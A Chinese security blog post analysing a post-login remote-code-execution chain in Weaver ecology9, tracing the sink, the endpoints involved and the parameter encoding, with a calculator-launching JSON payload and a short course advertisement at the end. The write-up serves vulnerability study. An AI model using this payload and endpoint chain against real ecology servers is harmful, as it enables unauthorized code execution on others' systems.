#  泛微ecology 历史漏洞浅析(一)  
原创 路人甲
                    路人甲  红细胞安全实验室   2026-04-01 02:55  
  
   
  
## 前言  
  
在泛微ecology9  
中，有不少后台RCE  
在利用过程中payload  
较为明显，容易被WAF  
拦截，当中有个比较有意思的后台rce代码执行利用点；且payload  
可以天然绕过WAF  
## Sink寻找  
  
寻找代码执行类sink  
时，通常都是基于正则去匹配一些如js  
代码执行、反序列化、表达式注入等利用点，但是如果没搜到常规利用点，我们不妨试着把目光放在代码中的工具类上，很多时候我们追踪的sink  
实际上就在系统自身的业务包的utlis  
包下，例如在泛微的com.weaver.formmodel.mobile.utils  
下，有一个TextUtil  
的工具类，其中就有一个方法名为evalScriptCodeBlock  
，通过类名就能看出来是执行脚本/表达式一类操作。  
  
在evalScriptCodeBlock  
方法中，存在一个一眼看过去很敏感的方法evaluateString  
，这个方法是js.jar  
依赖中的方法  
  
如果第一次碰见某个sink  
的方法不太熟悉的时候，不妨把这段代码抠出来，本地写一个demo  
调一下试试看，通过传递evaluateString  
的第二个参数为java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")  
，执行后，可以发现代码确实可以执行成功  
```
import org.mozilla.javascript.Context;import org.mozilla.javascript.ScriptableObject;public class Demo {    public static void main(String[] args) {        Context var17 = Context.enter();        ScriptableObject var18 = var17.initStandardObjects();        String var6 = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")";        Object var19 = var17.evaluateString(var18, var6, (String)null, 1, (Object)null);    }}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XnQZuIjp3xu8PsYFnicymXlbGxACDlXyoicFKNV7GmS4OmMcyib3XDiazMFlRt45b4d4g7EkobmNyhvaZFltYyjSGlUL2PLTfW2zRU/640?wx_fmt=png&from=appmsg "")  
## 漏洞分析  
  
能够成功利用后，我们接下来要做的就是反向追踪入口，在com.api.mobilemode.web.mobile.component.DataSetAction#parseData  
方法中，该类继承至BaseMobileAction  
，在泛微ecology9  
中，继承至BaseMobileAction  
的类，且指定了@ActionMapping  
注解，我们可以通过/mobilemode/Action.jsp  
来进行调用  
  
首先是拿到mec_id  
参数值，然后调用this.getDataSetMap(var1)  
方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XlgkH8XbqvUHQUrMXbybuyrwcYrNicqibnwrkdLzia0pKkVIO5gYP1LwNglXu7EcAO1ibBjCl6FEw6g2BYWEZJM543dk7Ub6wBzE9s/640?wx_fmt=png&from=appmsg "")  
  
在getDataSetMap  
方法中，通过mec_id  
作为参数调用com.weaver.formmodel.mobile.mec.dao.MECDao#getMecById  
方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xn6nEfmLJ7jlXGCqtQbk7T8wo4GZjqdEFrWZDF1OHhJkBjeKO6ky0JQnVuDOptoTbRSoNibYqyk8ejwXkFGWM2JOj1xlYc1laHo/640?wx_fmt=png&from=appmsg "")  
  
getMecById  
方法中，实际上是通过mec_id  
作为id，在MobileExtendComponent  
表中进行查询，将返回的结果封装为MobileExtendComponent  
对象进行返回  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XnRGf3ltn3M3ED5khsg3G3cFoDpNLy268O0nM1tGNlaNrDeFKJBWK3XZJYZlh41ib2iaIZMPCYtibyDiaqgdtdtaiaMAbCN5ib9x0xxw/640?wx_fmt=png&from=appmsg "")  
  
接着，如果MobileExtendComponent  
对象的mectype  
属性值为DataSet  
时才会进入if  
分支中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xmd1NpYWmBfdybpbVl18BLQKMLOoLmssSf0NibiagFMqwAr0nGkStuZNqMC2M25ee6ibX8bpWsUDNI1dSzHxhUjzBJWLiceJMiaOiclA/640?wx_fmt=png&from=appmsg "")  
  
接着，拿到MobileExtendComponent  
对象的Mecparam  
属性，将其转换成JSONObject  
对象，获取sourceType  
、sqlwhere  
参数值  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xnb3uavB4qCoLpYY1ATfYvcNb0JLNt0cpMGUOibBJNuuhmt7gE2Kib0nBh32CLw0riaJp9Ytt6A2d5MyoOn2TB1DKYL4Ot0XKsYkU/640?wx_fmt=png&from=appmsg "")  
  
接着，sourceType  
必须为0  
才能进入if  
分支中，从JSONObject  
中拿到tableid  
，作为参数调用com.weaver.formmodel.data.manager.FormInfoManager#getMainField  
得到一个List  
，这里不重要，重要的是将sqlwhere  
作为参数调用了TextUtil.evalScriptCodeBlock  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XlscqrI7TXLHwDpOibxCBYU5LYswPlibj9XUH2l3KOAkY3lV9YMstbcksHshsWUqqkvAQrCEcLaDNBTyGwQWMGODYjuibWiaESeVWE/640?wx_fmt=png&from=appmsg "")  
  
接着，进入到evalScriptCodeBlock  
方法中  
```
public static String evalScriptCodeBlock(String var0, User var1, Map<String, String> var2) {        // 正则匹配 \\[\\[(.*?)]]        Matcher var3 = PATTERN_JS_TAG.matcher(var0);        StringBuffer var4;        String var6;          for(var4 = new StringBuffer(); var3.find(); var3.appendReplacement(var4, var6)) {            String var5 = var3.group();            var6 = var5.trim().replaceAll("\\s+", " ");            // 去掉 [[  ]] 保留 code            var6 = var6.substring(2, var6.length() - 2);            var6 = (new SystemVariableParser(var1)).parse(var6);            // 从字符串 var6 中，找出所有形如 {xxx} 的内容            ArrayList var7 = Util.matchAll(var6, "\\{([a-zA-Z0-9_]*)\\}", 0, -1);            String var9;            String var11;            if (var7.size() > 0) {                // 遍历var7 调用Util.replaceString(var6, var9, var11) 替换 var6 占位符 为 var2 中的值                for(Iterator var8 = var7.iterator(); var8.hasNext(); var6 = Util.replaceString(var6, var9, var11)) {                    // 拿到{para1}                    var9 = (String)var8.next();                    // 去掉 { } 拿到 para1                     String var10 = var9.substring(1, var9.length() - 1);                    // 从var2中获取值 (这里的var2)是拿到所有http请求参数的值                    var11 = Util.null2String((String)var2.get(var10));                }            }            try {                // 创建Context 对象                Context var17 = Context.enter();                // 初始化                ScriptableObject var18 = var17.initStandardObjects();                // 触发代码执行                Object var19 = var17.evaluateString(var18, var6, (String)null, 1, (Object)null);                if (var19 instanceof Undefined) {                    var6 = "";                } else {                    var6 = Util.null2String(var19);                }            } catch (Exception var15) {                MobileCommonUtil.log(TextUtil.class, "evalScriptCode error: " + var6);                var6 = "[[" + var6 + "]]";            } finally {                Context.exit();            }        }        var3.appendTail(var4);        return var4.toString();    }
```  
  
evalScriptCodeBlock  
方法中，当sqlwhere  
中满足\ \[\ \[(.*?)]]  
正则时，会对其进行处理，如果sqlwhere  
中有特定的占位符，那么会进行相应的替换，随后就会调用Context#evaluateString  
执行表达式  
  
通过如上分析，我们知道evaluateString  
方法是可以执行代码的，并且可以由DataSetAction#parseData  
方法调用到，通过传递mec_id  
参数，在MobileExtendComponent  
表中获取相关参数，尤其是mecparam  
，会将其解析为JSONObject  
，得到的sqlwhere  
如果满足\ \[\ \[(.*?)]]  
正则，就会被当成表达式处理；那么现在最关键的点，就是怎么向MobileExtendComponent  
表中插入我们所需的参数  
## 插入数据  
  
前面我们分析mec_id  
参数的调用时，跟进了MECDao  
类中，该类主要是操作MobileExtendComponent  
表的增删改查，在该类中，我们找到一个save  
方法，可以对MobileExtendComponent  
表进行插入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XmZEibxqeG97K8FtnAyIO2WpghFxEjhNOq5WT6ib0icLic5p177Yk7NFE29JG7SQ1qLyYbFaGF2A3d0skqh7P7yP7KsnVwkCd6ib6Bk/640?wx_fmt=png&from=appmsg "")  
  
通过反向追踪，找到了com.api.mobilemode.web.admin.AppDesignerAction#saveHomepageContent  
这个方法，对应接口为/api/mobilemode/admin/designer/saveHomepageContent  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XlXS1pcVwiaV0joAOwY8IRag6de5LR1NsxpJkhDBYiaVyu7IeFXMCYSs1jyNKIcvgyicPPEwtfhAfExrxa56sTGd7KftI2wjgL9CU/640?wx_fmt=png&from=appmsg "")  
  
首先，调用ActionProcessor.handleWithManager  
方法，接着会handle  
方法验证用户是否登录，使用MobileUserInit.getUser  
意味着可以通过sessionkey  
进行调用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkhwRRqianXeHZicf2zonDV66GcGxVvtvAYlicJlzaqxPeab7cRwiaW8M5KsPGAQlVRvEKicTbAianZgKKVIF5KvwVSTvciaMghCRGnG8/640?wx_fmt=png&from=appmsg "")  
  
然后还会对用户权限及lic  
进行校验  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xln8wmThqibrQTq7kEWAaOG5w93dxdsovoU4nEHYyK8DDIMoiakOQue9cx1iaXGpMZcJm8Lia7ttqVB2miaseCw70haR3DCGYnGhCMk/640?wx_fmt=png&from=appmsg "")  
  
将HttpServletRequest  
包装成MobileFileUpload  
对象，拿到id  
、appid  
，接着依旧是调用 this.checkAppEditRight(var2x, var6)  
检测权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XlumGl6IUDVmvANgaEsZF5u1VliaDyXpdvwgibAa3xictDEO6Ogib9GKL3lHTCSY4HicZGzhnhnPvkKjCxnl33KeSAraCfqPic2icasBc/640?wx_fmt=png&from=appmsg "")  
  
MobileFileUpload  
中仅对getAttachment  
方法进行了重写  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XlaIEicJ8kgMTcCC0mpxDicg3uM34sHeoL85bgUDVCzNtgR5HhVzkjCQFxX1U9DBMur31nyOmYRaY3KroLWF2IR4GicVSMOz6qQCs/640?wx_fmt=png&from=appmsg "")  
  
MobileFileUpload  
继承至FileUpload  
，当调用getParameter  
获取参数时，如果不是上传请求包，还是可以拿到参数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xmc83G5Un1iadVUWHwf51yMwto9Cl05VPTIunKermiajVWbxaPibSCBh2bmPuN8054F7udz5bL1AGw24EcRQUOCdnfQfzzcwB291Y/640?wx_fmt=png&from=appmsg "")  
  
接着checkAppEditRight  
中调用了RightManager.whetherCanOperateApp  
，调用getNoRightAppids  
拿到一个List  
，判断传递的appid  
是否在其中，如果在则返回false  
，但默认为空，随便怎么传都不会返回false  
，isUseManageDetach()  
默认返回false  
，所以appid  
随便传递什么都可以  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XntRmmcpicXpkhSDM5HnrQTYzlBDyT42PCpEd2kqyldCbATnRcTAngjgnKTWebpg8h8KcoO5QA6GibZQOZ6dbGo3SBXekNt6818Q/640?wx_fmt=png&from=appmsg "")  
  
接着，获取config  
参数，调用MobileCommonUtil.decompressByLZ  
进行解密，将其解密的结果转换成JSONObject  
对象var8  
，再将其值赋值给另一个JSONObject  
对象var9  
，这里不是重点，但必须要传递，否则转换为JSONObject  
时会报错  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XlvMUqKx1eG360E59bGfU5QlboOviaUndgxibBc5iaHeiblNW9leY35j09xKEhtQv1X9ibjKW6qEcSrAicppmcKHVIOk90Woo26xGRf8/640?wx_fmt=png&from=appmsg "")  
  
首先来看看MobileCommonUtil.decompressByLZ  
，创建DecryptLZ  
对象，调用decrypt  
进行解密  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XlkfRdQZlz0yFKDO9BmzGyW8DGMX9lo9ZAFcRYJgqexSE7XoBssYjniaVaib1oRiaLZREB2Wh29AFPt4sU1UT2POOKf7gFz2NtRiao/640?wx_fmt=png&from=appmsg "")  
  
这个方法看起来不像解密方法，而是一种字符串转换的方法，以,  
分隔字符串得到一个ArrayList  
，调用Util.getIntValue  
拿到int  
类型数据，将其转换成String  
，也就是我们必须传递类似55,56,57,58  
这种格式字符串  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xl98g8UlxEkHBTwYenL61xmOicQxYK4ywplwFlvLRXKunOBWS4W0sia7rYyq6T116HyOdVDgUFibYmAwk9aSK5he5N0kFoib7ibvxkY/640?wx_fmt=png&from=appmsg "")  
  
很简单的就可以写一个方法用于生成加密字符串  
```
import com.weaver.formmodel.mobile.security.decrypt.DecryptLZ;public class Decrypt {    public static void main(String[] args) {        String str = "ecology";        String encrypt = encrypt(str);        System.out.println("encrypt result:" + encrypt);    }    public static String encrypt(String str) {        char[] chars = str.toCharArray();        String res = "";        for (int i = 0; i < chars.length; i++) {            res += ((int)chars[i])+",";        }        return res;    }}
```  
  
接着拿到mobiledeviceid  
、parentid  
、components  
参数，这里会调用decompressByLZ  
对components  
进行解密，然后转换成JSONArray  
对象，我们只需要关注解密后的var14  
参数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XlpQ0h2rgtXPusxp2Xp7AibbFntFIaU937W8aCr7BBraUhWGwukNfqyibSo1FudZ1n5q4emWsGoViaR0EiaqibI40J3Jab7pibjXibK7Y/640?wx_fmt=png&from=appmsg "")  
  
接着，还有两个for  
循环，这里其实我们可以完全忽略掉，因为接下来，一个最重要的调用点var37.mecCRUD2  
，实际上就是只把var14  
作为参数传递进去，所以实际分析漏洞的过程中需要把精力放在主线上，不要钻无意义的牛角尖，只有走不通的时候，我们再回来具体分析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XlGLJrbYspyQ9qAAyBPwo5m5kY9csMeOpso651f5uibq5d406RgibF6GgWsZRM8R9CwW1nA8zGgMJib5ZBwOTicl1WHe0YquiaHvnws/640?wx_fmt=png&from=appmsg "")  
  
主要关注MECService#mecCRUD2  
方法的调用，这跟我们向MobileExtendComponent  
表中插入息息相关  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0Xn8j0jnMLnXYhydtja2jq44Xic1W0ibuPAxnP5y38aqKwqJLeQGniaEW5HsRicff5oQKsIU8IIykiaGBNugKEyODJaIziczF60EHgb7o/640?wx_fmt=png&from=appmsg "")  
  
进入到mecCRUD2  
方法中  
```
public void mecCRUD2(String var1, String var2, String var3, String var4) {        ArrayList var5 = new ArrayList();        // 通过var3 和 var4 作为条件 查询出多个 MobileExtendComponent 存放到List中        List var6 = this.mecDao.getMecByObjid(var3, var4);        // 遍历        for(int var7 = 0; var7 < var6.size(); ++var7) {            // 获取当前遍历的 MobileExtendComponent 的id属性值            String var8 = ((MobileExtendComponent)var6.get(var7)).getId();            Pattern var9 = Pattern.compile("<abbr[^>]+id\\s*=\\s*['\"]" + var8 + "['\"][^>]*>", 34);            Matcher var10 = var9.matcher(var1);            if (!var10.find()) {                this.delete(var8);                var5.add(var8);            }        }        // 这是 components 解密后的值 转换成JSONArray 对象        JSONArray var14 = JSONArray.fromObject(var2);        // 遍历        for(int var15 = 0; var15 < var14.size(); ++var15) {            JSONObject var16 = (JSONObject)var14.get(var15);            // 获取id            String var17 = Util.null2String(var16.get("id"));            // 如果不在 ArrayList 中才会进入            if (!var5.contains(var17)) {                // 获取 type                String var11 = Util.null2String(var16.get("type"));                // 获取props                JSONObject var12 = (JSONObject)var16.get("props");                if ("FBrowser".equals(var11)) {                    var12.remove("modifyShowFields");                }                String var13 = var12.toString();                this.saveOrUpdate(var17, var11, var13, var3, var4);            }        }    }
```  
  
在saveOrUpdate  
方法中，实际上就是通过传递进来的参数构造一个MobileExtendComponent  
对象，然后继续调用saveOrUpdate  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xkm4u2ic41FZpeyA1KZUq61Kf3RDicO7QUcqHh64eanpSwhqo6c04AwxaC8wJA6LeWkRI8wLMw6VOpia7iaLgrOobN6WQ8ThYkUP0s/640?wx_fmt=png&from=appmsg "")  
  
在saveOrUpdate  
方法中，首先会拿到Id  
，先判断数据库中是否已近存在，如果存在则调用this.mecDao.update(var1)  
进行更新，不存在才会调用this.mecDao.save(var1)  
进行保存  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XlffQns3glTwD30XfUGTL6b9nzEbmLT6nPgtZ3y7l1GKCFSuHezjnOwhaRcnB4ib9RdbGxSKA1npuKnDkyRe5Rz4gOPQaQWAwCY/640?wx_fmt=png&from=appmsg "")  
## 利用  
  
前面的保存调用流程分析完毕；我们再来回顾下前文我们分析DataSetAction#getDataSetMap  
方法，以确保我们应该保存哪些参数及格式:  
- • 通过mec_id  
获取MobileExtendComponent  
对象，MobileExtendComponent  
的mectype  
必须为DataSet  
  
- • 获取MobileExtendComponent  
对象的mecparam  
属性，将其转换成JSONObject  
  
- • 拿到sourceType  
和sqlwhere  
，sourceType  
必须为0  
  
- • sqlwhere  
作为参数调用evalScriptCodeBlock  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XlibcYJ9mCuAvEdYB6fjE1yY9F5qCqmyveNKrOnDabVc72rQozxbcpAgsfhYsOBbfvSglaTvjiao15ABcHAlbNYu9Tzu8Nic3icHj0/640?wx_fmt=png&from=appmsg "")  
  
我们主要控制MobileExtendComponent  
的mecparam  
属性，并且这是个json  
字符串，字符串中必须有sourceType  
和sqlwhere  
，sourceType  
必须为0  
，sqlwhere  
必须满足PATTERN_JS_TAG  
正则，也就是\ \[\ \[(.*?)]]  
  
在mecCRUD2  
方法中，我们分析了，components  
会转换为JSONArray  
，然后获取其中的JSONObject  
，拿到id  
、type  
、props  
，格式也就是这样  
```
[{"id":"123","type":"DataSet", "props":{"sourceType":0,"sqlwhere":"[[java.lang.Runtime.getRuntime().exec(\"calc.exe\")]]"}}]
```  
  
由此我们便可以串起来完整利用，先插入数据库  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkIibVl0FSvebB6s2MGIHc6icKDUbTicpSvDEtZ3fyFfD9BibceRCVibtQ0lQUNW5KYZlT6mmwWlF2EXUlTwcdQdxCDJRVgVoiafNEok/640?wx_fmt=png&from=appmsg "")  
  
这里虽然异常，但是数据库中已经保存成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XlnRZwv0zuYkh2cSr0SfSt3aL6DPibELEzuKUQwJhYvEVA58pFJ7eGWq5DwiaSRoHnXqlKa74FOWbzW8skfVFmEgsUjofa7UrCAk/640?wx_fmt=png&from=appmsg "")  
  
然后再通过/mobilemode/Action.jsp  
进行触发  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xkia7KJV2Y9B8zCA14H4BmARCHuRcjzjCzxZib291DUlKMe7LZZe8Myr9puNuxOIiaqb3Vw5MzicTeGldQKyvGVuNibJQSC6MZcEmNM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkYJ4iaZr8nrFNNub3DlpK6R31uibrfKTrvOQrohKdS8YM5icSqlZRCvJCzVT0yNokqtPbjICOCzeRhxPeml8maHONSoqfolHPytY/640?wx_fmt=png&from=appmsg "")  
## 最后  
  
本文当中所提及内容均来自实战代码审计班课程内容，关于该产品更加深入利用手法可以咨询课程  
  
顺便再推荐一下我师傅的代码审计课程。近期某统一认证产品的课程章节已结束，马上开启某报表的章节，感兴趣的朋友可以尽快加入。课程中包含各类产品最新补丁对应的 0day 漏洞（非水洞） 的挖掘与分析；过往课程也涵盖多款市面产品的 0day / 1day / nday 漏洞案例讲解。课程后续会持续更新推进，支持一次报名长期学习与答疑。适合真正对代码审计感兴趣、或想系统学习但缺少思路与方法体系的同学（如有其他目的请勿打扰）。对基础要求不高，能读懂代码即可，真正帮助你从只能读懂代码到找到问题。个人学习过程中受益良多，特此分享推荐给希望提升自己的朋友（非广告）。若有打扰，敬请见谅。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xn4q7xnuXrXbwbX85xE01pveNdib0fRXI0FJDIY5exw3UPvIb5yKiaHHbMAZPffE2ps89HcficK8lwY9TFzxFJyL9C3z80lur4SjQ/640?wx_fmt=png&from=appmsg "")  
  
  
   
  
  
